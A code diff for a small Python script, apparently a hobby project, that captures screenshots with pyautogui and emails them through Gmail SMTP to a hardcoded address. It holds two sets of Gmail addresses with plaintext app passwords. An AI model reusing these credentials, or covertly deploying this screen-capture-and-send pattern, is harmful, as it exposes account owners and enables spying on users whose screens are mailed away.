@@ -1,5 +1,5 @@
 # Aqui estara la tralla por una parte el screenshot  y por otra el envío del correo.
-
+# Enviar el correo de la otra forma para que haya mas seguridad en el envío de este.
 import smtplib, pyautogui
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
@@ -39,7 +39,7 @@ html = """
 <!DOCTYPE html>
 <html>
 <head>
-	<title>Correo de ejemplo</title>
+	<title>Simple Email</title>
 	<style>
 		body {
 			font-family: Arial, sans-serif;
@@ -106,8 +106,8 @@ html = """
 </html>
 """
 
-msg_text = MIMEText(html, 'html')
-msg.attach(msg_text)
+#msg_text = MIMEText(html, 'html')
+#msg.attach(msg_text)
 
 def send_image(path_image, email="juanmapipa4@gmail.com", name_image="patata.jpg"):
 
@@ -120,16 +120,16 @@ def send_image(path_image, email="juanmapipa4@gmail.com", name_image="patata.jpg
 
     # Para poder poner un nombre a la imagen
     #img = MIMEImage(img_data, name="hola.jpg")
-    img = MIMEImage(img_data, name=name_image)
-    img.add_header('Content-ID', '<image1>')
+    img = MIMEImage(img_data, name="imagen.jpg")
+ #   img.add_header('Content-ID', '<image1>')
     msg.attach(img)
 
     msg['Subject'] = 'Capture Image'
-    msg['From'] = 'monolocacapop@gmail.com'
+    msg['From'] = 'monolopepe5@gmail.com'
     msg['To'] = email
-
     smtp = smtplib.SMTP('smtp.gmail.com', 587)
     smtp.starttls()
-    smtp.login('monolocacapop@gmail.com', 'ngkdwjlpolfrzyop')
-    smtp.sendmail('monolocacapop@gmail.com', email, msg.as_string())
+    smtp.login('monolopepe5@gmail.com', 'rqkvlzrtfbvdcgsu')
+    smtp.sendmail('monolopepe5@gmail.com', email, msg.as_string())
     smtp.quit()
+
